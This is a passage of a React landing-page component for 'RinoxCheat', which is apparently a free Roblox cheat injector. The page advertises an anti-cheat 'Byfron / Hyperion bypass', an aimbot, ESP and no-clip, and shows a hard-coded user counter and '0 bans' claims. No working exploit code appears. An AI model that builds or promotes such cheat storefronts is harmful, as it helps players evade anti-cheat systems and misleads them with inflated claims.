                  className="ripple-btn w-full mt-5 h-12 rounded-lg font-medium text-base shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] disabled:opacity-80 hover:scale-105 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 transform"
                >
                  {loading ? (
                    <span className="flex items-center gap-2">
                      <span className="h-4 w-4 rounded-full border-2 border-primary-foreground/40 border-t-primary-foreground animate-spin" />
                      {t.loading}
                    </span>
                  ) : (
                    t.injectButton
                  )}
                </Button>

                {loading && steps.length === 0 && (
                  <div className="mt-6 space-y-2">
                    <div className="skeleton h-4 w-3/4" />
                    <div className="skeleton h-4 w-2/3" />
                  </div>
                )}

                {(steps.length > 0 || done) && (
                  <div className="mt-6 space-y-2">
                    {steps.map((s, i) => (
                      <div
                        key={i}
                        className="animate-slide-in-right flex items-center gap-2 text-sm text-muted-foreground"
                        style={{ animationDelay: `${i * 60}ms` }}
                      >
                        <CheckCircle2 className="h-4 w-4 text-primary shrink-0 animate-bounce-in" />
                        <span>{s}</span>
                      </div>
                    ))}
                    {done && (
                      <div className="animate-scale-in mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30">
                        <div className="flex items-center gap-2 font-medium text-primary mb-1">
                          <CheckCircle2 className="h-4 w-4 animate-pulse-brightness" />
                          {t.cheatsInjected}
                        </div>
                        <p className="text-sm text-foreground/80">{t.launchRoblox}</p>
                      </div>
                    )}
                  </div>
                )}

                {/* Local history */}
                <div className="mt-6 pt-4 border-t border-border/40">
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2 text-xs text-muted-foreground">
                      <HistoryIcon className="h-3.5 w-3.5" />
                      <span>{t.history}</span>
                    </div>
                    {history.length > 0 && (
                      <button
                        onClick={() => { setHistory([]); sounds.play("click"); }}
                        className="text-xs text-muted-foreground hover:text-destructive transition-colors flex items-center gap-1"
                      >
                        <Trash2 className="h-3 w-3" /> {t.clearHistory}
                      </button>
                    )}
                  </div>
                  {history.length === 0 ? (
                    <p className="text-xs text-muted-foreground/60 italic">{t.historyEmpty}</p>
                  ) : (
                    <ul className="space-y-1">
                      {history.map((h, i) => (
                        <li
                          key={h.at}
                          className="text-xs flex items-center justify-between px-2 py-1.5 rounded bg-secondary/40 border border-border/40 animate-fade-in"
                          style={{ animationDelay: `${i * 40}ms` }}
                        >
                          <span className="truncate mr-2">{h.label}</span>
                          <span className="text-muted-foreground shrink-0">
                            {new Date(h.at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                          </span>
                        </li>
                      ))}
                    </ul>
                  )}
                </div>
              </div>
            </div>
          </section>
        </Reveal>

        {/* Trusted by */}
        <Reveal>
          <section className="mt-20 text-center">
            <div className="inline-flex flex-col items-center glass rounded-2xl px-8 py-6">
              <span className="text-xs text-muted-foreground uppercase tracking-widest mb-2">{t.trustedBy}</span>
              <div className="text-4xl sm:text-5xl font-semibold text-gradient bg-[length:200%_auto] animate-gradient-pan">
                <AnimatedNumber value={847231} suffix="+" />
              </div>
              <span className="text-sm text-muted-foreground mt-1">{t.trustedByPlayers}</span>
            </div>
          </section>
        </Reveal>

        {/* Tutorial */}
        <Reveal>
          <section id="tutorial" aria-label="Tutorial video" className="max-w-3xl mx-auto mt-20">
            <div className="text-center mb-6">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4">
                <Play className="h-3.5 w-3.5 text-primary" />
                <span>{t.tutorial}</span>
              </div>
              <h2 className="text-2xl sm:text-3xl font-semibold tracking-tight">{t.tutorialTitle}</h2>
              <p className="text-sm text-muted-foreground mt-2">{t.tutorialDesc}</p>
            </div>
            <div className="relative aspect-video w-full rounded-2xl overflow-hidden border border-border bg-card glow-ring hover:shadow-[0_0_40px_hsl(var(--primary)/0.3)] transition-all duration-300">
              <iframe
                className="absolute inset-0 w-full h-full"
                src="https://www.youtube-nocookie.com/embed/hXn2q5PHNGs"
                title="Tutorial — RinoxCheat"
                loading="lazy"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                referrerPolicy="strict-origin-when-cross-origin"
                allowFullScreen
              ></iframe>
            </div>
            <p className="mt-2 text-center text-xs text-muted-foreground">
              {t.videoNotDisplaying}<a className="underline hover:text-primary transition-colors" href="https://youtu.be/tLsw-blhUAI" target="_blank" rel="noopener noreferrer">{t.openYoutube}</a>.
            </p>
          </section>
        </Reveal>

        {/* Roadmap */}
        <Reveal>
          <section className="max-w-3xl mx-auto mt-24">
            <div className="text-center mb-10">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4">
                <Rocket className="h-3.5 w-3.5 text-primary" />
                <span>Roadmap</span>
              </div>
              <h2 className="text-3xl font-semibold tracking-tight mb-2">{t.roadmapTitle}</h2>
              <p className="text-muted-foreground">{t.roadmapDesc}</p>
            </div>
            <div className="relative pl-8 space-y-6 before:content-[''] before:absolute before:left-3 before:top-2 before:bottom-2 before:w-px before:bg-gradient-to-b before:from-primary before:via-primary/40 before:to-transparent">
              {[
                { q: t.q1, title: t.q1t, desc: t.q1d, done: true },
                { q: t.q2, title: t.q2t, desc: t.q2d, done: false },
                { q: t.q3, title: t.q3t, desc: t.q3d, done: false },
              ].map((item, i) => (
                <Reveal key={i} delay={i * 100}>
                  <div className="relative">
                    <div className={`absolute -left-[26px] top-1.5 h-3 w-3 rounded-full border-2 ${item.done ? "bg-primary border-primary shadow-[0_0_12px_hsl(var(--primary))]" : "bg-background border-primary/50"}`} />
                    <div className="glass rounded-xl p-4 hover:border-primary/40 transition-all">
                      <div className="text-xs text-primary font-medium mb-1">{item.q}</div>
                      <div className="font-medium mb-1">{item.title}</div>
                      <p className="text-sm text-muted-foreground">{item.desc}</p>
                    </div>
                  </div>
                </Reveal>
              ))}
            </div>
          </section>
        </Reveal>

        {/* Reviews */}
        <Reveal>
          <section className="max-w-4xl mx-auto mt-24">
            <div className="text-center mb-10">
              <h2 className="text-3xl font-semibold tracking-tight mb-2">{t.reviewsTitle}</h2>
              <p className="text-muted-foreground">{t.reviewsDesc}</p>
            </div>
            <div className="relative overflow-hidden">
              <div
                className="flex transition-transform duration-700 ease-out"
                style={{ transform: `translateX(-${(reviewIndex % REVIEWS.length) * 100}%)` }}
              >
                {REVIEWS.map((review, i) => (
                  <div key={i} className="w-full shrink-0 px-2">
                    <div className="glass rounded-2xl p-8 max-w-xl mx-auto hover:border-primary/40 transition-all duration-300">
                      <div className="flex items-center gap-3 mb-4">
                        <div className="w-12 h-12 rounded-full bg-primary/20 flex items-center justify-center font-semibold text-primary text-lg">
                          {review.name[0]}
                        </div>
                        <div>
                          <div className="font-medium">{review.name}</div>
                          <div className="text-xs text-muted-foreground">{review.game}</div>
                        </div>
                      </div>
                      <div className="flex gap-1 mb-3">
                        {Array.from({ length: review.rating }).map((_, j) => (
                          <Star key={j} className="h-4 w-4 fill-primary text-primary" />
                        ))}
                      </div>
                      <p className="text-base text-muted-foreground leading-relaxed">"{review.text}"</p>
                    </div>
                  </div>
                ))}
              </div>
              <div className="flex justify-center gap-2 mt-6">
                {REVIEWS.map((_, i) => (
                  <button
                    key={i}
                    onClick={() => { setReviewIndex(i); sounds.play("click"); }}
                    aria-label={`Review ${i + 1}`}
                    className={`h-2 rounded-full transition-all duration-300 ${
                      i === reviewIndex % REVIEWS.length
                        ? "w-8 bg-primary"
                        : "w-2 bg-muted-foreground/30 hover:bg-muted-foreground/60"
                    }`}
                  />
                ))}
              </div>
            </div>
          </section>
        </Reveal>

        {/* Games Showcase */}
        <Reveal>
          <GamesShowcase
            title={language === "fr" ? "Jeux supportés" : "Supported games"}
            desc={language === "fr" ? "Compatible avec les jeux Roblox les plus populaires." : "Compatible with the most popular Roblox games."}
            searchPlaceholder={language === "fr" ? "Rechercher un jeu..." : "Search a game..."}
            emptyLabel={language === "fr" ? "Aucun jeu trouvé." : "No game found."}
          />
        </Reveal>

        {/* Comparison */}
        <Reveal>
          <Comparison
            title={language === "fr" ? "Pourquoi RinoxCheat ?" : "Why RinoxCheat?"}
            desc={language === "fr" ? "Comparé aux autres solutions du marché." : "Compared to other solutions on the market."}
            us="RinoxCheat"
            them={language === "fr" ? "Autres cheats" : "Other cheats"}
            rows={language === "fr" ? [
              { label: "Prix", us: "Gratuit", them: "Payant" },
              { label: "Bypass Byfron / Hyperion", us: true, them: false },
              { label: "Livraison instantanée", us: true, them: false },
              { label: "Tous appareils", us: true, them: false },
              { label: "Mises à jour continues", us: true, them: false },
              { label: "Historique local privé", us: true, them: false },
              { label: "0 bans rapportés en 2026", us: true, them: false },
            ] : [
              { label: "Price", us: "Free", them: "Paid" },
              { label: "Byfron / Hyperion bypass", us: true, them: false },
              { label: "Instant delivery", us: true, them: false },
              { label: "All devices", us: true, them: false },
              { label: "Continuous updates", us: true, them: false },
              { label: "Private local history", us: true, them: false },
              { label: "0 bans reported in 2026", us: true, them: false },
            ]}
          />
        </Reveal>

        {/* Changelog */}
        <Reveal>
          <Changelog
            title={language === "fr" ? "Notes de version" : "Changelog"}
            desc={language === "fr" ? "Toutes les dernières mises à jour." : "All the latest updates."}
            entries={language === "fr" ? [
              { version: "v3.0", date: "Jan 2026", changes: [
                "Nouveau bypass Byfron v3 indétectable",
                "Interface repensée + effets spotlight",
                "Historique local des injections",
                "Support complet mobile (iOS / Android)",
              ]},
              { version: "v2.8", date: "Dec 2025", changes: [
                "Aimbot silencieux amélioré (+40% précision)",
                "Nouveau ESP avec HP et distance",
                "Correction du fly sur les jeux physiques",
              ]},
              { version: "v2.5", date: "Nov 2025", changes: [
                "Ajout du mode No-Clip stable",
                "Optimisation des performances (-30% CPU)",
              ]},
            ] : [
              { version: "v3.0", date: "Jan 2026", changes: [
                "New undetectable Byfron v3 bypass",
                "Redesigned UI + spotlight effects",
                "Local injection history",
                "Full mobile support (iOS / Android)",
              ]},
              { version: "v2.8", date: "Dec 2025", changes: [
                "Improved silent aimbot (+40% accuracy)",
                "New ESP with HP and distance",
                "Fixed fly on physics-based games",
              ]},
              { version: "v2.5", date: "Nov 2025", changes: [
                "Added stable No-Clip mode",
                "Performance optimization (-30% CPU)",
              ]},
            ]}
          />
        </Reveal>

        {/* FAQ */}
        <Reveal>
          <section className="max-w-2xl mx-auto mt-24">
            <div className="text-center mb-10">
              <h2 className="text-3xl font-semibold tracking-tight mb-2">{t.faqTitle}</h2>
              <p className="text-muted-foreground">{t.faqDesc}</p>
            </div>
            <div className="space-y-3">
              {FAQs.map((faq, i) => (
                <div
                  key={i}
                  className="glass rounded-xl overflow-hidden hover:border-primary/40 transition-all duration-300 animate-fade-in"
                  style={{ animationDelay: `${i * 50}ms` }}
                >
                  <button
                    onClick={() => { setExpandedFaq(expandedFaq === i ? null : i); sounds.play("click"); }}
                    className="w-full px-6 py-4 flex items-center justify-between hover:bg-secondary/40 transition-all duration-300 text-left"
                  >
                    <span className="font-medium">{faq.q}</span>
                    <ChevronDown
                      className={`h-5 w-5 text-primary transition-transform duration-300 ${
                        expandedFaq === i ? "rotate-180" : ""
                      }`}
                    />
                  </button>
                  {expandedFaq === i && (
                    <div className="px-6 py-4 border-t border-border/40 bg-secondary/20 animate-float-up text-sm text-muted-foreground">
                      {faq.a}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </section>
        </Reveal>
      </main>

      <footer className="border-t border-border/60 mt-24">
        <div className="max-w-7xl mx-auto px-6 sm:px-10 lg:px-14 py-8 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-muted-foreground">
          <div className="flex items-center gap-2">
            <div className="h-5 w-5 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] flex items-center justify-center">
              <Crosshair className="h-3 w-3 text-primary-foreground" />
            </div>
            <span>{t.copyright}</span>
          </div>
          <p>{t.privateNote}</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
